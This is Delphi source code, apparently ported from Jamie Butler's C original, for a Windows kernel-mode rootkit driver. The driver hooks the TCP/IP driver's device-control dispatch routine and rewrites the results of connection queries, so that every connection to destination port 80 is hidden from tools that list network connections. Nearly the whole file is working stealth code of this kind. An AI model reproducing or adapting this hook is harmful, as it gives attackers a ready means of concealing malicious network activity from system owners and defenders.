//*********************************************
//  Irp Hook, Ring0
//
// Author: Jamie Butler
// Ported to delphi by Hs32-Idir
//
// http://wWw.Hs32-Idir.Tk
//*********************************************

unit IrpHook;

interface

uses
  nt_status,
  ntoskrnl,
  macros,
  native,
  ntutils,
  hal,
  fcall;
 
function _DriverEntry(DriverObject:PDriverObject; RegistryPath: PUnicodeString):NTSTATUS; stdcall;

implementation

type
 BOOL   = BOOLEAN;
 DWORD  = ulong;
 PDWORD = ^DWORD;
 WORD   = ushort;
 BYTE	  = uchar;
 LPBYTE = ^BYTE;

const
 IOCTL_TCP_QUERY_INFORMATION_EX = $00120003;

 SL_INVOKE_ON_CANCEL  = $20;
 SL_INVOKE_ON_SUCCESS = $40;
 
 CO_TL_ENTITY = $400;
 CL_TL_ENTITY = $401;
 ER_ENTITY    = $380;
 CO_NL_ENTITY = $300;
 CL_NL_ENTITY = $301;

const
 deviceTCPNameBuffer = '\Device\Tcp';  //	WCHAR

type
 PIO_COMPLETION_ROUTINE = function (DeviceObject: PDeviceObject; Irp : PIRP; Context : PVOID):NTSTATUS; stdcall;

type
 _CONNINFO101 = record
  status:	ulong;
  src_addr : ulong;
  src_port : ushort;
  unk1 : ushort;
  dst_addr : ulong;
  dst_port : ushort;
  unk2 : ushort;
end;
CONNINFO101  = _CONNINFO101;
PCONNINFO101 = ^CONNINFO101;

type
 _CONNINFO102 = record
  status : ulong;
  src_addr : ulong;
  src_port : ushort;
  unk1 : ushort;
  dst_addr : ulong;
  dst_port : ushort;
  unk2 : ushort;
	pid : ulong;
end;
CONNINFO102  = _CONNINFO102;
PCONNINFO102 = ^CONNINFO102;
	
type
 _CONNINFO110 = record
  size : ulong;
  status : ulong;
  src_addr : ulong;
  src_port : ushort;
  unk1 : ushort;
  dst_addr : ulong;
  dst_port : ushort;
  unk2 :ushort;
  pid :	ulong;
  unk3 : Array[0..35-1] of PVOID;//[35];
end;
CONNINFO110  = _CONNINFO110;
PCONNINFO110 = ^CONNINFO110;

type
 _REQINFO = record
  OldCompletion : PIO_COMPLETION_ROUTINE;
  ReqType :	ulong;
end;
REQINFO  = _REQINFO;
PREQINFO = ^REQINFO;

type
 TDIEntityID = record
  tei_entity : ulong;
  tei_instance : ulong;
end;

type
 TDIObjectID = record
  toi_entity: TDIEntityID;
  toi_class : ulong;
  toi_type : ulong;
  toi_id : ulong;
end;
PTDIObjectID = ^TDIObjectID;

type
  _OLDIRPMJDEVICECONTROL = function(A: PDeviceObject; B: PIRP):NTSTATUS; stdcall;
  
var
  OldIrpMjDeviceControl : _OLDIRPMJDEVICECONTROL;

var
  pFile_tcp  : PFILE_OBJECT;
	pDev_tcp   : PDeviceObject;
  pDrv_tcpip : PDriverObject;

function HTONS(A:Word):Word;
begin
  Result := (($FF and a) shl 8) or (($FF00 and a) shr 8 );
end;

function DriverUnload(DriverObject: PDriverObject): NTSTATUS; Stdcall;
begin
  DbgPrint('Driver Unload');
	if @OldIrpMjDeviceControl <> nil then	InterlockedExchange(PLONG(@pDrv_tcpip^.MajorFunction[IRP_MJ_DEVICE_CONTROL]), LONG(@OldIrpMjDeviceControl));
	if (pFile_tcp <> NiL) then	ObDereferenceObject(pFile_tcp);
 //	pFile_tcp := NiL;
	Result := STATUS_SUCCESS;
end;

function IoCompletionRoutine(DeviceObject:PDeviceObject; Irp : PIRP;	Context: PVOID): NTSTATUS; stdcall;
var
  OutputBuffer:PVOID;
  NumOutputBuffers : Integer;
  p_compRoutine : PIO_COMPLETION_ROUTINE;
  i :	DWORD;
begin
	// Connection status values:
	// 0 = Invisible
	// 1 = CLOSED
	// 2 = LISTENING
	// 3 = SYN_SENT
	// 4 = SYN_RECEIVED
	// 5 = ESTABLISHED
	// 6 = FIN_WAIT_1
	// 7 = FIN_WAIT_2
	// 8 = CLOSE_WAIT
	// 9 = CLOSING
	// ...
	OutputBuffer  := Irp^.UserBuffer;
	p_compRoutine := PREQINFO(Context)^.OldCompletion;

	if (PREQINFO(Context)^.ReqType = $101) then
	begin
		NumOutputBuffers := Irp^.IoStatus.Information div sizeof(CONNINFO101);
		for i := 0 to NumOutputBuffers - 1 do
		begin
			// Hide all Web connections
			if (HTONS(Word(PCONNINFO101(Ulong(OutputBuffer) + i)^.dst_port)) = 80) then
			PCONNINFO101(Ulong(OutputBuffer) + i)^.status := 0;
		end;
	end
 else
  if (PREQINFO(Context)^.ReqType = $102) then
	begin
		NumOutputBuffers := Irp^.IoStatus.Information div sizeof(CONNINFO102);
		for i := 0 to NumOutputBuffers -1 do
		begin
			// Hide all Web connections
			if (HTONS(Word(PCONNINFO102(Ulong(OutputBuffer)+ i)^.dst_port)) = 80) then
			PCONNINFO102(Ulong(OutputBuffer) +i)^.status := 0;
		end;
	end
 else
  if (PREQINFO(Context)^.ReqType = $110) then
	begin
		NumOutputBuffers := Irp^.IoStatus.Information div sizeof(CONNINFO110);
		for  i := 0 to NumOutputBuffers -1 do
		begin
			// Hide all Web connections
			if (HTONS(Word(PCONNINFO110(Ulong(OutputBuffer)+ i)^.dst_port)) = 80) then
			PCONNINFO110(Ulong(OutputBuffer) + i)^.status := 0; 
		end;
	end;

	ExFreePool(Context);

	(*
	for(i = 0; i < NumOutputBuffers; i++)
		DbgPrint("Status: %d",OutputBuffer[i].status);
		DbgPrint(" %d.%d.%d.%d:%d",OutputBuffer[i].src_addr & 0xff,OutputBuffer[i].src_addr >> 8 & 0xff, OutputBuffer[i].src_addr >> 16 & 0xff,OutputBuffer[i].src_addr >> 24,HTONS(OutputBuffer[i].src_port));
		DbgPrint(" %d.%d.%d.%d:%d\n",OutputBuffer[i].dst_addr & 0xff,OutputBuffer[i].dst_addr >> 8 & 0xff, OutputBuffer[i].dst_addr >> 16 & 0xff,OutputBuffer[i].dst_addr >> 24,HTONS(OutputBuffer[i].dst_port));
	*)

	if ((Irp^.StackCount > 1) and (@p_compRoutine <> NiL))  then
   Result := p_compRoutine(DeviceObject, Irp, NiL)
	else
   Result := Irp^.IoStatus.Status;
end;

function HookedDeviceControl(DeviceObject: PDeviceObject; Irp:PIRP): NTSTATUS; stdcall;
var
  irpStack : PIO_STACK_LOCATION;
  ioTransferType : ULONG;
  inputBuffer :	^TDIObjectID; // *
//  context :	DWORD;
begin
	DbgPrint('The current IRP is at %x', Irp);
  // Get a pointer to the current location in the Irp. This is where
  // the function codes and parameters are located.
  irpStack := IoGetCurrentIrpStackLocation(Irp);
  inputBuffer := nil;

  case irpStack^.MajorFunction of

  IRP_MJ_DEVICE_CONTROL :
  begin

	  if irpStack^.MinorFunction = 0 then
    begin
    	if irpStack^.Parameters.DeviceIoControl.IoControlCode = IOCTL_TCP_QUERY_INFORMATION_EX then
			begin
				ioTransferType := irpStack^.Parameters.DeviceIoControl.IoControlCode;
				ioTransferType := (ioTransferType and 3); //ioTransferType &= 3;
				if ioTransferType = METHOD_NEITHER then // Need to know the method to find input buffer
				begin
					inputBuffer^ := PTDIObjectID(irpStack^.Parameters.DeviceIoControl.Type3InputBuffer)^;  //  *)

					// CO_TL_ENTITY is for TCP and CL_TL_ENTITY is for UDP
					if inputBuffer^.toi_entity.tei_entity = CO_TL_ENTITY then
					begin
						// DbgPrint("Input buffer %x\n",inputBuffer);
						if (inputBuffer^.toi_id = $101) or (inputBuffer^.toi_id = $102) or (inputBuffer^.toi_id = $110) then  // ||
						begin
							// Call our completion routine if IRP successful
							irpStack^.Control := 0;
							irpStack^.Control := SL_INVOKE_ON_SUCCESS;

							// Save old completion routine if present
							irpStack^.Context := ExAllocatePool(NonPagedPool, SizeOf(REQINFO)); // PIO_COMPLETION_ROUTINE(

							PREQINFO(irpStack^.Context)^.OldCompletion := irpStack^.CompletionRoutine;
							PREQINFO(irpStack^.Context)^.ReqType       := inputBuffer^.toi_id;

							// Setup our function to be called on completion of IRP
							irpStack^.CompletionRoutine := @IoCompletionRoutine;  //PIO_COMPLETION_ROUTINE(
						end;
					end;
				end;
			end;
		end;
  end;
 end;
 Result := OldIrpMjDeviceControl(DeviceObject, Irp);
end;


function InstallTCPDriverHook(): NTSTATUS; stdcall;
var
  _ntStatus :  NTSTATUS;
  // TUnicodeString deviceNameUnicodeString;
  // TUnicodeString deviceLinkUnicodeString;
  deviceTCPUnicodeString	: TUnicodeString;
 {
  pFile_tcp  = NULL;
  pDev_tcp   = NULL;
  pDrv_tcpip = NULL;
 }
begin
  DbgPrint('Install Hook');
  {
  memset(pFile_tcp,0,sizeof(pFile_tcp));
  memset(pDev_tcp,0,sizeof(pDev_tcp));
  memset(pDrv_tcpip,0,sizeof(pDrv_tcpip));
  }
	RtlInitUnicodeString(@deviceTCPUnicodeString, deviceTCPNameBuffer);
	_ntStatus := IoGetDeviceObjectPointer(@deviceTCPUnicodeString, FILE_READ_DATA, @pFile_tcp, @pDev_tcp);
  
	if not (NT_SUCCESS(_ntStatus)) then
  begin
		Result := _ntStatus;
    Exit;
  end;
  
	pDrv_tcpip := pDev_tcp^.DriverObject;

	@OldIrpMjDeviceControl := pDrv_tcpip^.MajorFunction[IRP_MJ_DEVICE_CONTROL];

	if @OldIrpMjDeviceControl <> nil then	InterlockedExchange(PLONG(@pDrv_tcpip^.MajorFunction[IRP_MJ_DEVICE_CONTROL]), LONG(@HookedDeviceControl));

  Result := STATUS_SUCCESS;
end;

function _DriverEntry(DriverObject : PDriverObject; RegistryPath : PUnicodeString): NTSTATUS; stdcall;
var
  _ntStatus : NTSTATUS;
begin
  DbgPrint('Driver Load');
	@OldIrpMjDeviceControl := NiL;
  DriverObject^.DriverUnload := @DriverUnload;
	
	_ntStatus := InstallTCPDriverHook();

	if not (NT_SUCCESS(_ntStatus)) then
	Result := _ntStatus
 else
	Result := STATUS_SUCCESS;
end;


end.